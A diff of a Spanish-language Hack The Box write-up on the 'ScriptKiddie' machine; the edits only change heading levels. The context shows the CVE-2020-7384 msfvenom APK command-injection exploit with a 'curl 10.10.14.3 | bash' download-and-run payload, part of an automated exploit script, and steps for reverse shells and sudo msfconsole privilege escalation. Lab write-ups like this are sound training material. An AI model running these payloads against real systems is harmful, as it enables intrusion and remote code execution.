@@ -2,7 +2,7 @@
 title: ScriptKiddie WriteUp
 date: 2022-09-16 19:00:00 +/-TTTT
 categories: [HTB, Linux]
-tags: [cve-2020-7384]     # TAG names should always be lowercase
+tags: [cve-2020-7384]     ## TAG names should always be lowercase
 image: /photos/2022-09-16-ScriptKiddie-WriteUp/htb.jpg
 ---
 
@@ -10,7 +10,7 @@ image: /photos/2022-09-16-ScriptKiddie-WriteUp/htb.jpg
 Posteriormente, a través de un programa que ejecuta el usuario ***pwn*** a intervalos regulares de tiempo podremos inyectar código y conseguir ejecutar comandos como este usuario.  
 Para finalizar, *pwn* podrá ejecutar como el usuario ***root*** la herramienta *msfconsole*, con la cual nos podremos *spawnear* una consola como root.
 
-#  Información de la máquina 
+##  Información de la máquina 
 
 <table width="100%" cellpadding="2">
     <tr>
@@ -23,9 +23,9 @@ Para finalizar, *pwn* podrá ejecutar como el usuario ***root*** la herramienta 
     </tr>
 </table>
 
-# Reconocimiento  
+## Reconocimiento  
 
-## ping  
+### ping  
 
 Primero enviaremos un *ping* a la máquina victima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.
 
@@ -33,7 +33,7 @@ Primero enviaremos un *ping* a la máquina victima para saber su sistema operati
 
 Vemos que nos enfrentamos a una máquina ***Linux***.
 
-## nmap  
+### nmap  
 
 Procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 
 
@@ -60,7 +60,7 @@ Para acabar con ```nmap```, lanzaremos una seria de *scripts* básicos de enumer
 
 Vemos que en el puerto 22 corre *SSH* y en el 5000 corre un servidor *HTTP*.
 
-## Puerto 5000 abierto (HTTP)  
+### Puerto 5000 abierto (HTTP)  
 
 Empezaremos el reconocimiento del servidor *HTTP* lanzando la herramienta *whatweb*, que nos servirá para descubrir las tecnologías que corren detrás del servicio.
 
@@ -96,17 +96,17 @@ He intentado inyectar comandos en cada uno de los campos sin éxito alguno. Por 
 
 Tiene buena pinta porque, como habíamos visto antes, la sección de *payloads* acepta la subida de un plantilla y como sistema operativo te deja elegir *android*.
 
-## CVE-2020-7384  
+### CVE-2020-7384  
 
 Con ```searchsploit -x multiple/local/49491.py``` podemos ver el POC de la vulnerabilidad. Es el siguiente: 
 
 ```python 
-# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
-# Exploit Author: Justin Steven
-# Vendor Homepage: https://www.metasploit.com/
-# Software Link: https://www.metasploit.com/
-# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
-# CVE : CVE-2020-7384
+## Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
+## Exploit Author: Justin Steven
+## Vendor Homepage: https://www.metasploit.com/
+## Software Link: https://www.metasploit.com/
+## Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
+## CVE : CVE-2020-7384
 
 #!/usr/bin/env python3
 import subprocess
@@ -114,10 +114,10 @@ import tempfile
 import os
 from base64 import b64encode
 
-# Change me
+## Change me
 payload = 'curl 10.10.14.3 | bash'
 
-# b64encode to avoid badchars (keytool is picky)
+## b64encode to avoid badchars (keytool is picky)
 payload_b64 = b64encode(payload.encode()).decode()
 dname = f"CN='|echo {payload_b64} | base64 -d | sh #"
 
@@ -133,17 +133,17 @@ keystore_file = os.path.join(tmpdir, "signing.keystore")
 storepass = keypass = "password"
 key_alias = "signing.key"
 
-# Touch empty_file
+## Touch empty_file
 open(empty_file, "w").close()
 
-# Create apk_file
+## Create apk_file
 subprocess.check_call(["zip", "-j", apk_file, empty_file])
 
-# Generate signing key with malicious -dname
+## Generate signing key with malicious -dname
 subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                        "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])
 
-# Sign APK using our malicious dname
+## Sign APK using our malicious dname
 subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                        "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])
 
@@ -153,7 +153,7 @@ print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.
 ```
 Simplemente tenemos que especificar el comando que queremos inyectar en el campo *payload* y el programa nos creara el archivo *evil.apk* correspondiente. En mi caso, el *payload* que especificaré será ````'curl 10.10.14.3 | bash'````
 
-## Explotando CVE-2020-7384  
+### Explotando CVE-2020-7384  
 
 ````'curl 10.10.14.3 | bash'```` hará que la máquina victima me envíe una petición HTTP a mi servidor. Yo estaré corriendo un servidor HTTP de python compartiendo un fichero *index.html* malicioso que contendrá un sentencia en bash, que será una *reverse shell*. El ```| bash``` es para que este código sea interpretado del lado de la máquina y me envíe la consola interactiva. También deberé de estar en escucha por el puerto 443 para recibirla.
 
@@ -191,9 +191,9 @@ Ahora deberemos escalar privilegios para convertirnos en el usuario ***root***.
 
 ##  Consiguiendo shell como pwn  
 
-## Reconocimiento del sistema  
+### Reconocimiento del sistema  
 
-###  *Homedir* de kid  
+####  *Homedir* de kid  
 
 Empezaremos investigando los archivos que hay en el *homedir* de kid. Dentro del directorio *html* nos encontramos con los siguientes archivos:
 
@@ -220,7 +220,7 @@ Por lo tanto, si inyectamos por ejemplo ```wordpress; whoami``` en el campo *spl
 
 El ```while true; do cat hackers; done``` es porque hay algún tipo de tarea en el sistema que esta borrando el contenido del archivo nada mas se escribe en él.
 
-###  *Homedir* de pwn  
+####  *Homedir* de pwn  
 
 En el *homedir* de pwn podemos ver el siguiente contenido:
 
@@ -261,7 +261,7 @@ Y nos ponemos en escucha de trazas *ICMP* por la interfaz tun0 recibiremos dos t
 
 <img src="/photos/2022-09-16-ScriptKiddie-WriteUp/tcpdump.jpg" alt="drawing"  />  
 
-## Shell  
+### Shell  
 
 Siguiendo la lógica del apartado anterior, ahora vamos a inyectar un código para que el usuario *pwn* nos envíe una *bash*. Es el siguiente: 
 
@@ -274,15 +274,15 @@ Al igual que cuando recibimos la shell de *kid*, tendremos que desplegar un serv
 
 Una vez ejecutado el *echo* recibiremos la consola. A partir de este punto, haremos el mismo tratamiento que hicimos antes para tener una *shell* completamente interactiva y buscaremos nuevas vías de convertirnos en ***root***.
 
-##  Shell como root  
+##  Consiguiendo shell como root  
 
-## Reconocimiento  
+### Reconocimiento  
 
 Podemos ver que el usuario *pwn* tiene definido en el archivo ***sudoers*** que puede ejecutar la herramienta *msfconsole* como el usuario *root*.
 
 <img src="/photos/2022-09-16-ScriptKiddie-WriteUp/sudoers.jpg" alt="drawing"  />  
 
-## Shell  
+### Shell  
 
 Ejecutaremos la herramienta:
 
@@ -347,17 +347,17 @@ def makeRequest():
 
 def apkcreate():
     
-    # Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
-    # Exploit Author: Justin Steven
-    # Vendor Homepage: https://www.metasploit.com/
-    # Software Link: https://www.metasploit.com/
-    # Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
-    # CVE : CVE-2020-7384
+    ## Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
+    ## Exploit Author: Justin Steven
+    ## Vendor Homepage: https://www.metasploit.com/
+    ## Software Link: https://www.metasploit.com/
+    ## Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
+    ## CVE : CVE-2020-7384
     
     payload = f'curl {ip} | bash'
     print(payload)
     
-    # b64encode to avoid badchars (keytool is picky)
+    ## b64encode to avoid badchars (keytool is picky)
     payload_b64 = b64encode(payload.encode()).decode()
     dname = f"CN='|echo {payload_b64} | base64 -d | sh #"
 
@@ -370,13 +370,13 @@ def apkcreate():
 
     open(empty_file, "w").close()
 
-    # Create apk_file
+    ## Create apk_file
     subprocess.check_call(["zip", "-j", apk_file, empty_file])
 
-    # Generate signing key with malicious -dname
+    ## Generate signing key with malicious -dname
     subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,"-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])
 
-    # Sign APK using our malicious dname
+    ## Sign APK using our malicious dname
     subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file, "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])
 
 def indexcreate():
